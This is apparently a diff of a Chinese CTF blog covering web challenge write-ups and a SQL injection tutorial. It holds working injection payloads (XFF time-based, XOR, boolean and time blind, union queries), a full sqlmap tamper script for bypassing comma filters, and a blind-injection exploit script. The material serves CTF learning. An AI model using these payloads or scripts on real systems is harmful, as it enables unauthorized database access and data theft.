len(&quot;IF(&quot;):comma1]</span><br><span class="line">                    __ = payload[comma1 + 1:comma2]</span><br><span class="line">                    ___ = payload[comma2 + 1:end]</span><br><span class="line">                    newVal = &quot;CASE WHEN %s THEN %s ELSE %s END&quot; % (_, __, ___)</span><br><span class="line">                    payload = payload[:index] + newVal + payload[end + 1:]</span><br><span class="line">                else:</span><br><span class="line">                    break</span><br><span class="line">                    </span><br><span class="line">        return payload</span><br><span class="line"></span><br><span class="line">    def commalessifnull(payload):</span><br><span class="line">        if payload and payload.find(&quot;IFNULL&quot;) &gt; -1:</span><br><span class="line">            while payload.find(&quot;IFNULL(&quot;) &gt; -1:</span><br><span class="line">                index = payload.find(&quot;IFNULL(&quot;)</span><br><span class="line">                depth = 1</span><br><span class="line">                comma, end = None, None</span><br><span class="line"></span><br><span class="line">                for i in xrange(index + len(&quot;IFNULL(&quot;), len(payload)):</span><br><span class="line">                    if depth == 1 and payload[i] == &apos;,&apos;:</span><br><span class="line">                        comma = i</span><br><span class="line"></span><br><span class="line">                    elif depth == 1 and payload[i] == &apos;)&apos;:</span><br><span class="line">                        end = i</span><br><span class="line">                        break</span><br><span class="line"></span><br><span class="line">                    elif payload[i] == &apos;(&apos;:</span><br><span class="line">                        depth += 1</span><br><span class="line"></span><br><span class="line">                    elif payload[i] == &apos;)&apos;:</span><br><span class="line">                        depth -= 1</span><br><span class="line"></span><br><span class="line">                if comma and end:</span><br><span class="line">                    _ = payload[index + len(&quot;IFNULL(&quot;):comma]</span><br><span class="line">                    __ = payload[comma + 1:end].lstrip()</span><br><span class="line">                    newVal = &quot;CASE WHEN %s=NULL THEN %s ELSE %s END&quot; % (_, __, _)</span><br><span class="line">                    payload = payload[:index] + newVal + payload[end + 1:]</span><br><span class="line">                else:</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">        return payload</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line">    </span><br><span class="line">    if payload:</span><br><span class="line">        retVal = re.sub(r&apos;(?i)TIMESTAMPADD\(\w+,\d+,NULL\)&apos;, &apos;NULL&apos;, retVal)</span><br><span class="line">        retVal = re.sub(r&apos;(?i)MID\((.+?)\s*,\s*(\d+)\s*\,\s*(\d+)\s*\)&apos;, &apos;MID(\g&lt;1&gt; FROM \g&lt;2&gt; FOR \g&lt;3&gt;)&apos;, retVal)</span><br><span class="line">        retVal = commalessif(retVal)</span><br><span class="line">        retVal = commalessifnull(retVal)</span><br><span class="line">        retVal = re.sub(r&apos;(?i)LIMIT\s*(\d+),\s*(\d+)&apos;, &apos;LIMIT \g&lt;2&gt; OFFSET \g&lt;1&gt;&apos;, retVal)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>
+$connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);
 
-<p>然后Sqlmap里跑一下，语句如下:<br><img src="https://s1.ax1x.com/2018/06/07/CHlWOs.jpg" alt="sqlmap"></p>
+mysql_select_db($db) or die(&quot;Unable to select database&quot;);
+
+$ip = getIp();
+echo &#39;your ip is :&#39;.$ip;
+$sql=&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;
+mysql_query($sql);</code></pre><p>explode过滤逗号，所以报错注入肯定行不通。看到网上的Wp说是基于时间的盲注，盲注点很显然是XFF。经过测试payload有效：</p>
+<pre><code>X-Forwarded-For:1&#39;+sleep(5) and &#39;1&#39;=&#39;1</code></pre><p>页面返回有一个延时，这里就不能用if(,,)语句了，因为过滤了逗号，用另一个注入语句:</p>
+<pre><code>select case when (条件) then 代码1 else 代码 2 end</code></pre><p>于是有了如下的payload：</p>
+<pre><code>1&#39; and (select case when (select length(flag) from flag limit 1)=32 then sleep(5) else 1 end) and &#39;1&#39;=&#39;1</code></pre><p>emmm,手注是不可能的，这辈子是不可能手注的（手动滑稽），我们抓个包让sqlmap以XFF为注入点扫描，再加个过滤逗号的tamper就好了。若以XFF为注入点，则要在抓包后的导出文件里XFF后加*，标识为注入点如图：<br><img src="https://s1.ax1x.com/2018/06/06/CHe1Cd.png" alt="zhurudian"><br>然后找了网上大神的过滤逗号的tamper，放在Sqlmap目录里，命名为comamalessmysql.py</p>
+<pre><code>#!/usr/bin/env python
+
+import re
+
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.LOWEST
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    &quot;&quot;&quot;
+    Replaces some instances with something whthout comma 
+
+    Requirement:
+        * MySQL
+
+    Tested against:
+        * MySQL 5.0
+
+
+    &gt;&gt;&gt; tamper(&#39;ISNULL(TIMESTAMPADD(MINUTE,7061,NULL))&#39;)
+    &#39;ISNULL(NULL)&#39;
+
+    &gt;&gt;&gt; tamper(&#39;MID(VERSION(), 2, 1)&#39;)
+    &#39;MID(VERSION() FROM 2 FOR 1)&#39;
+
+    &gt;&gt;&gt; tamper(&#39;IF(26=26,0,5)&#39;)
+    &#39;CASE WHEN 26=26 THEN 0 ELSE 5 END&#39;
+
+    &gt;&gt;&gt; tamper(&#39;IFNULL(NULL,0x20)&#39;)
+    &#39;CASE WHEN NULL=NULL THEN 0x20 ELSE NULL END&#39;
+
+    &gt;&gt;&gt; tamper(&#39;LIMIT 2, 3&#39;)
+    &#39;LIMIT 3 OFFSET 2&#39;
+    &quot;&quot;&quot;
+
+
+    def commalessif(payload):
+        if payload and payload.find(&quot;IF&quot;) &gt; -1:
+            while payload.find(&quot;IF(&quot;) &gt; -1:
+                index = payload.find(&quot;IF(&quot;)
+                depth = 1
+                comma1, comma2, end = None, None, None
+
+                for i in xrange(index + len(&quot;IF(&quot;), len(payload)):
+                    if depth == 1 and payload[i] == &#39;,&#39; and not comma1:
+                        comma1 = i
+
+                    elif depth == 1 and payload[i] == &#39;,&#39; and comma1:
+                        comma2 = i
+
+                    elif depth == 1 and payload[i] == &#39;)&#39;:
+                        end = i
+                        break
+
+                    elif payload[i] == &#39;(&#39;:
+                        depth += 1
+
+                    elif payload[i] == &#39;)&#39;:
+                        depth -= 1
+
+                if comma1 and comma2 and end:
+                    _ = payload[index + len(&quot;IF(&quot;):comma1]
+                    __ = payload[comma1 + 1:comma2]
+                    ___ = payload[comma2 + 1:end]
+                    newVal = &quot;CASE WHEN %s THEN %s ELSE %s END&quot; % (_, __, ___)
+                    payload = payload[:index] + newVal + payload[end + 1:]
+                else:
+                    break
+
+        return payload
+
+    def commalessifnull(payload):
+        if payload and payload.find(&quot;IFNULL&quot;) &gt; -1:
+            while payload.find(&quot;IFNULL(&quot;) &gt; -1:
+                index = payload.find(&quot;IFNULL(&quot;)
+                depth = 1
+                comma, end = None, None
+
+                for i in xrange(index + len(&quot;IFNULL(&quot;), len(payload)):
+                    if depth == 1 and payload[i] == &#39;,&#39;:
+                        comma = i
+
+                    elif depth == 1 and payload[i] == &#39;)&#39;:
+                        end = i
+                        break
+
+                    elif payload[i] == &#39;(&#39;:
+                        depth += 1
+
+                    elif payload[i] == &#39;)&#39;:
+                        depth -= 1
+
+                if comma and end:
+                    _ = payload[index + len(&quot;IFNULL(&quot;):comma]
+                    __ = payload[comma + 1:end].lstrip()
+                    newVal = &quot;CASE WHEN %s=NULL THEN %s ELSE %s END&quot; % (_, __, _)
+                    payload = payload[:index] + newVal + payload[end + 1:]
+                else:
+                    break
+
+        return payload
+
+    retVal = payload
+
+    if payload:
+        retVal = re.sub(r&#39;(?i)TIMESTAMPADD\(\w+,\d+,NULL\)&#39;, &#39;NULL&#39;, retVal)
+        retVal = re.sub(r&#39;(?i)MID\((.+?)\s*,\s*(\d+)\s*\,\s*(\d+)\s*\)&#39;, &#39;MID(\g&lt;1&gt; FROM \g&lt;2&gt; FOR \g&lt;3&gt;)&#39;, retVal)
+        retVal = commalessif(retVal)
+        retVal = commalessifnull(retVal)
+        retVal = re.sub(r&#39;(?i)LIMIT\s*(\d+),\s*(\d+)&#39;, &#39;LIMIT \g&lt;2&gt; OFFSET \g&lt;1&gt;&#39;, retVal)
+
+    return retVal
+</code></pre><p>然后Sqlmap里跑一下，语句如下:<br><img src="https://s1.ax1x.com/2018/06/07/CHlWOs.jpg" alt="sqlmap"></p>
 <h3 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h3><p>这道题困了我一天，一开始我以为是盲注，于是花时间在写脚本花了一天。。后来找到一个wp其实就是手注，只是过滤掉了union一些关键词，看一下题目：</p>
 <ul>
 <li>查询有结果时，返回nothing</li>
@@ -195,29 +428,15 @@
 <ol>
 <li>构造id=1’^(条件)^’</li>
 <li>判断的两个条件一个是括号里的条件，另一个是后面的’’，’’为空，即为0。所以括号里的条件若是成立，则页面返回错误；反之则页面返回正常</li>
-<li>完整payload:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/1ndex.php?id=1&apos;^(length(&apos;union&apos;)=5)^&apos;</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<p>返回正确，说明判断条件是错的，所以union被过滤了<br>我们用叠加语句看一下 uniunionon是否会被过滤，payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/1ndex.php?id=1&apos;^(length(&apos;uniunionon&apos;)=5)^&apos;</span><br></pre></td></tr></table></figure>
-
-<p>返回错误，说明判断条件正确，所以这个可以当作union使用。</p>
-<ol start="4">
+<li>完整payload:<pre><code>http://120.24.86.145:9004/1ndex.php?id=1&#39;^(length(&#39;union&#39;)=5)^&#39;</code></pre>返回正确，说明判断条件是错的，所以union被过滤了<br>我们用叠加语句看一下 uniunionon是否会被过滤，payload:<pre><code>http://120.24.86.145:9004/1ndex.php?id=1&#39;^(length(&#39;uniunionon&#39;)=5)^&#39;</code></pre>返回错误，说明判断条件正确，所以这个可以当作union使用。</li>
 <li>接下来就是一些基础查询了，题目说有两个flag，再查到另一个列时，出现一个网址：<br>Once_More.php</li>
 <li>里面还有一道注入题，因为它会回显你提交的参数，所以想知道过滤了什么直接就可以看出来，过滤了Union，我用的报错注入解决的</li>
 <li>over，这道题学习了异或注入判断过滤。</li>
 </ol>
 <h3 id="login3-SKCTF"><a href="#login3-SKCTF" class="headerlink" title="login3{SKCTF}"></a>login3{SKCTF}</h3><p>tip给了说是布尔盲注<br>在username这个注入点测试一下，初步手工模糊测试，发现过滤了空格、逗号、等号，没有过滤#和’。因为是布尔盲注，那我们构造ascii函数语句。首先我们猜测一个用户名吧,就猜Admin,发现回显是：password error。<br>这说明这个用户名存在，那么我们就可以把这句话作为一个判断对错的语句，结合异或注入进行ascii的猜测。（用户名错误时会返回 username does not exist!）</p>
 <ol>
-<li>过滤了‘=’，那么我们ascii的等号语句就没法使用了，经过测试like是绕不过去的。那我们就通过这句话替换掉等号：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos;^(ascii(&apos;a&apos;)-97)</span><br></pre></td></tr></table></figure>
-
-</li>
+<li>过滤了‘=’，那么我们ascii的等号语句就没法使用了，经过测试like是绕不过去的。那我们就通过这句话替换掉等号：<pre><code>username=admin&#39;^(ascii(&#39;a&#39;)-97)</code></pre>等价于：<pre><code>username=admin&#39;^(0)</code></pre>异或注入，因为a的十进制ascii为97，所以与（0）异或。</li>
 </ol>
-<p>等价于：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos;^(0)</span><br></pre></td></tr></table></figure>
-
-<p>异或注入，因为a的十进制ascii为97，所以与（0）异或。</p>
 <ul>
 <li>（0）条件时返回”password error”</li>
 <li>其余条件时返回”username does not exist!”</li>
@@ -233,55 +452,7 @@
             </div>
             <div class="continue">
             <a href="/2018/06/06/Web题目/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/06/06/WhaleCTF的Web题目/"> 
-                    WhaleCTF的Web题目 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-06-06   
-                </a>
-                
-                <a class="category">
-                    <i class="fa fa-th" aria-hidden="true"></i>  
-                </a>
-               
-                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li></ul>
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf，web/">ctf，web</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近要做的事太多了，实验班考核、末考、再加上来成都的同学多的一批。。没时间好好学点东西，前两天装Docker，基础太差了，现在Ubuntu上docker都没搭好环境。应对最近的考核，还是刷点题吧</p>
-<h3 id="瞎子摸鱼"><a href="#瞎子摸鱼" class="headerlink" title="瞎子摸鱼"></a>瞎子摸鱼</h3><p>是个Sql注入，一开始有回显我以为是基本的回显注入，后来fuzz发现过滤了函数、Infor、小括号，那基本上与回显注入无缘。我们构造admin是万能函数的时候，发现回显：<br>whaleadmin<br>我猜测这个是用户名，当不构造正确的用户名时，回显：<br>flag in the password content<br>所以后台的语句应该是这样的思路，如果查到用户名存在，则输出用户名的第一个值。若不存在，则返回flag那一堆。。</p>
-<p>一开始我和LinE师傅都没想到用order by来爆破password字段，后来看到一篇类似原题的帖子。。<br><a href="https://www.cnblogs.com/deen-/p/7008939.html" target="_blank" rel="noopener">Inject again 注入 过滤左右括号 order by</a><br>思路挺简单的，就是通过order by的升序排序法进行盲注<br>后来就是写exp了，被LinE师傅嘲讽了一波。。确实py能力太差了= =<br>这里偷偷贴一下LinE师傅的exp：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def send(flag,charset):</span><br><span class="line">    url = &quot;http://ctf.whaledu.com:10801/47g256f48gff/index.php&quot;</span><br><span class="line">    h = &#123;&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;</span><br><span class="line">    for i in range(len(charset)):</span><br><span class="line">        c = flag + charset[i]</span><br><span class="line">        payload = &quot;whaleadmin&apos; union select 1,0,&apos;&#123;&#125;&apos; order by 3#&quot;.format(c)</span><br><span class="line">        d = &quot;username=&#123;&#125;&amp;password=admin&quot;.format(payload)</span><br><span class="line">        r = requests.post(url,data=d,headers=h)</span><br><span class="line">        if &quot;whaleadmin&quot; in r.text:</span><br><span class="line">            return i</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line">    num = &quot;0123456789&quot;</span><br><span class="line">    a_z = &quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="line">    charset = list(num + a_z)</span><br><span class="line">    for i in range(0,80):</span><br><span class="line">        ret = send(flag, charset)</span><br><span class="line">        flag += charset[ret-1]</span><br><span class="line">        print flag</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<h3 id="正则进入"><a href="#正则进入" class="headerlink" title="正则进入"></a>正则进入</h3><p>源码泄露扫描得到：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;waht the hell?&quot;;</span><br><span class="line">$flag = &quot;*******&quot;; </span><br><span class="line">if  (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;]) </span><br><span class="line">&#123; </span><br><span class="line">    $password = $_POST[&apos;password&apos;]; </span><br><span class="line">    if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) </span><br><span class="line">    &#123; </span><br><span class="line">        echo &apos;Wrong Format&apos;; </span><br><span class="line">        exit; </span><br><span class="line">    &#125; </span><br><span class="line">    while (TRUE) </span><br><span class="line">    &#123; </span><br><span class="line">        $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;; </span><br><span class="line">        if (6 &gt; preg_match_all($reg, $password, $arr)) </span><br><span class="line">            break; </span><br><span class="line">        $c = 0; </span><br><span class="line">        $ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); </span><br><span class="line">        foreach ($ps as $pt) </span><br><span class="line">        &#123; </span><br><span class="line">            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) </span><br><span class="line">                $c += 1; </span><br><span class="line">        &#125; </span><br><span class="line">        if ($c &lt; 3) break; </span><br><span class="line">        if (&quot;42&quot; == $password) echo $flag; </span><br><span class="line">        else echo &apos;Wrong password&apos;; </span><br><span class="line">        exit; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>结整段代码来看，我们需要post一个字符串，该字符串的值为42，并且要包含标点、数字、大写字母、小写字母中三个及以上类型，同时匹配次数要不小于6次</p>
-<p>构造的payload:<br><code>password=420.00000e-1</code>或者<code>password=42.000000e-0</code></p>
-<p>利用科学计数法，xe(+-)x代表的意思是，x乘以10的x次方，之所以用.我一开始不明白，但是看一下句子猜测的话，这个点的作用应该还是“乘以”，即420乘以10^(-1)，就是42。而且.也把标点位占了，所以构造很巧妙。</p>
-<p>相关链接:<br><a href="http://dcx.sybase.com/1101/zh/dbreference_zh11/rf-sqllanguage-s-4915351.html" target="_blank" rel="noopener">正则表达式语法</a></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/06/06/WhaleCTF的Web题目/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -316,30 +487,18 @@
 <hr>
 <h2 id="关于环境"><a href="#关于环境" class="headerlink" title="关于环境"></a>关于环境</h2><p>本地用Phostudy搭建的PHP+MYSQL环境，写了一个简单的php，类似于无脑的ctf注入题，get传参Id值</p>
 <h2 id="简单的注入"><a href="#简单的注入" class="headerlink" title="简单的注入"></a>简单的注入</h2><p>刚才我们写的Php就是一个没有任何过滤的后端,值得注意的是,#的注释功能现在好像被和谐掉了，在Hackbar只能编码为%23才能代替#的作用（我竟然花了好长时间反复查看自己到底有没有过滤qaq），接下来看一下这类绝迹注入的流程.如果你本地有DVWA的环境,就直接注Simple类型就好了,先贴一张表的结构<br><img src="https://s1.ax1x.com/2018/05/30/C5JnSJ.png" alt="表结构"></p>
-<h3 id="查字段"><a href="#查字段" class="headerlink" title="查字段"></a>查字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; order by 1/2/3... %23</span><br></pre></td></tr></table></figure>
-
-<p>找到一个有回显的注入点，手动去猜字段，返回异常的N-1即为字段数</p>
+<h3 id="查字段"><a href="#查字段" class="headerlink" title="查字段"></a>查字段</h3><pre><code>?id=1&#39; order by 1/2/3... %23</code></pre><p>找到一个有回显的注入点，手动去猜字段，返回异常的N-1即为字段数</p>
 <h3 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h3><p>这里字段数确认为3</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; select 1,2,database() %23</span><br></pre></td></tr></table></figure>
-
-<p>两个月前刚学的时候没有搞清楚没什么Id要改成-1,其实很好理解,mysql的查询如果你的查询是存在的即返回结果,若查询不存在即返回查询结果.<br><img src="https://s1.ax1x.com/2018/05/30/C5JMO1.png" alt="avator"></p>
-<h3 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; select 1,2,table_name from infomation_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure>
-
-<h3 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; select 1,2,column_name from information_schema.columns where table_name=&apos;user&apos; %23</span><br></pre></td></tr></table></figure>
-
-<p>其中User为我们刚才查到的表</p>
-<h3 id="查列名下的具体值"><a href="#查列名下的具体值" class="headerlink" title="查列名下的具体值"></a>查列名下的具体值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; select 1,2,user from user %23</span><br></pre></td></tr></table></figure>
-
-<p>选择查询的列为user列,一般来说ctf的题都是让你查flag列下的值,Dump出来就好.</p>
+<pre><code>?id=-1&#39; select 1,2,database() %23</code></pre><p>两个月前刚学的时候没有搞清楚没什么Id要改成-1,其实很好理解,mysql的查询如果你的查询是存在的即返回结果,若查询不存在即返回查询结果.<br><img src="https://s1.ax1x.com/2018/05/30/C5JMO1.png" alt="avator"></p>
+<h3 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h3><pre><code>?id=-1&#39; select 1,2,table_name from infomation_schema.tables where table_schema=database() %23</code></pre><h3 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h3><pre><code>?id=-1&#39; select 1,2,column_name from information_schema.columns where table_name=&#39;user&#39; %23</code></pre><p>其中User为我们刚才查到的表</p>
+<h3 id="查列名下的具体值"><a href="#查列名下的具体值" class="headerlink" title="查列名下的具体值"></a>查列名下的具体值</h3><pre><code>?id=-1&#39; select 1,2,user from user %23</code></pre><p>选择查询的列为user列,一般来说ctf的题都是让你查flag列下的值,Dump出来就好.</p>
 <h3 id="关于Information-schema"><a href="#关于Information-schema" class="headerlink" title="关于Information_schema"></a>关于Information_schema</h3><p>MySQL 中有一个数据库叫做information_schema，储存数据库和表的元信息。information_schema中有两个重要的表，一个叫tables，储存表的元信息，有两列特别重要，table_schema是所属数据库，table_name是表名称。另一个表示columns，储存列的源信息，table_name列是所属表名称，column_name列是列名称</p>
 <h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注，即在SQL注入过程中，SQL语句执行选择后，选择的数据不能回显到前端，我们需要使用一些特殊的方法进行判断或尝试，这个过程称为盲注。其实我们用sqlmap完全可以跑，但是只会用工具最多也就是个脚本小子，要想更好的运用Sqlmap进行注入，我觉得应该从基础学起，搞清楚原理才是最重要的。</p>
 <h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>先贴一张自己写的php<br><img src="https://s1.ax1x.com/2018/05/30/C5JGFO.png" alt="avator"><br>即回显只有ture or false</p>
 <h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>普及一下用法，用mysql演示一下：<br><img src="https://s1.ax1x.com/2018/05/30/C5JNSH.png" alt="limit1"></p>
 <p><img src="https://s1.ax1x.com/2018/05/30/C5JYfe.png" alt="limit2"></p>
 <p><img src="https://s1.ax1x.com/2018/05/30/C5JJYD.png" alt="limit3"></p>
-<h4 id="猜库长"><a href="#猜库长" class="headerlink" title="猜库长"></a>猜库长</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and length(database())=? %23</span><br></pre></td></tr></table></figure>
-
-<p>?即为猜解的裤长，可以用二分法，及大于1，小于100，再从50划分长度。若条件成立返回ture</p>
+<h4 id="猜库长"><a href="#猜库长" class="headerlink" title="猜库长"></a>猜库长</h4><pre><code>?id=1&#39; and length(database())=? %23</code></pre><p>?即为猜解的裤长，可以用二分法，及大于1，小于100，再从50划分长度。若条件成立返回ture</p>
 <h4 id="猜库名"><a href="#猜库名" class="headerlink" title="猜库名"></a>猜库名</h4><p>substr()函数</p>
 <p>substr(string,start,length)</p>
 <ul>
@@ -352,11 +511,7 @@
 </ul>
 <p>令外用到ascii()函数，返回查询到的字符的ascii的十进制值，通过大于或者小于的逻辑判断这个值为多少，进而遍历完整的数据库名。<br><code>?id=1&#39; and ascii(substr(database(),1,1))&gt;? %23</code><br>通过分析，返回的ascii确认为104，对应‘h’，与库名的hpdoger的第一个字母相应。</p>
 <h4 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h4><p>这里需要在substr里嵌套mysql的语句，因为我们要找到对应的表，结合普通查询的语句来构造我们的payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1))&gt;116 %23</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1))&lt;118 %23</span><br></pre></td></tr></table></figure>
-
-<p>两者返回都为ture，可以判断第一个字母ascii值为117<br><img src="https://s1.ax1x.com/2018/05/30/C5JDTf.png" alt="chabiao"><br><img src="https://s1.ax1x.com/2018/05/30/C5JB0P.png" alt="chabiao"></p>
+<pre><code>?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1))&gt;116 %23</code></pre><pre><code>?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1))&lt;118 %23</code></pre><p>两者返回都为ture，可以判断第一个字母ascii值为117<br><img src="https://s1.ax1x.com/2018/05/30/C5JDTf.png" alt="chabiao"><br><img src="https://s1.ax1x.com/2018/05/30/C5JB0P.png" alt="chabiao"></p>
 <h4 id="猜列名"><a href="#猜列名" class="headerlink" title="猜列名"></a>猜列名</h4><p><img src="https://s1.ax1x.com/2018/05/30/C5J2lj.png" alt="lieming"><br>此语句猜解的是user表的第一个列名，如是想要猜解其它列名，则更改Limit 的值</p>
 <h4 id="猜字段值"><a href="#猜字段值" class="headerlink" title="猜字段值"></a>猜字段值</h4><p><img src="https://s1.ax1x.com/2018/05/30/C5Ylcj.png" alt="ziduanzhi"><br>道理相同</p>
 <h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>返回页面无法判断语句是否执行， 面对这种情况，基于布尔的SQL盲注就很难发挥作用了（因为基于布尔的SQL盲注的前提是Web程序返回的页面存在true和false两种不同的页面）。这时</p>
@@ -365,42 +520,33 @@
 <li><p>if()<br><code>if(expr1,expr2,expr3)</code><br>如果 expr1 为真，则 IF()函数执行expr2语句; 否则 IF()函数执行expr3语句。</p>
 </li>
 <li><p>sleep()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(seconds)</span><br></pre></td></tr></table></figure>
-
+<pre><code>sleep(seconds)</code></pre><p>延时一段时间</p>
 </li>
 </ul>
-<p>延时一段时间</p>
 <h4 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h4><p>基本思想跟与布尔盲注一样，给一句话，其他的换成相应查询就可以了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and if(ascii(substr(database(),1,1))&gt;100,sleep(10),null)</span><br></pre></td></tr></table></figure>
-
-<h2 id="关于绕过Waf"><a href="#关于绕过Waf" class="headerlink" title="关于绕过Waf"></a>关于绕过Waf</h2><h3 id="浅谈编码绕过waf"><a href="#浅谈编码绕过waf" class="headerlink" title="浅谈编码绕过waf"></a>浅谈编码绕过waf</h3><h4 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h4><p>这两天一直在刷sqli-labs，做到现在有一点感触。一开始知道有url编码绕过这种方式，但是对于为什么能绕过成功心里是没B数的。经过这两天的测试，我想说的是，这种url编码绕过简直扯淡。人家waf过滤掉了你，你就算编码传过去一个值，到了php页面又被还原再判断，所以相当于没有任何作用。但还是写一下关于url编码的一些理解：</p>
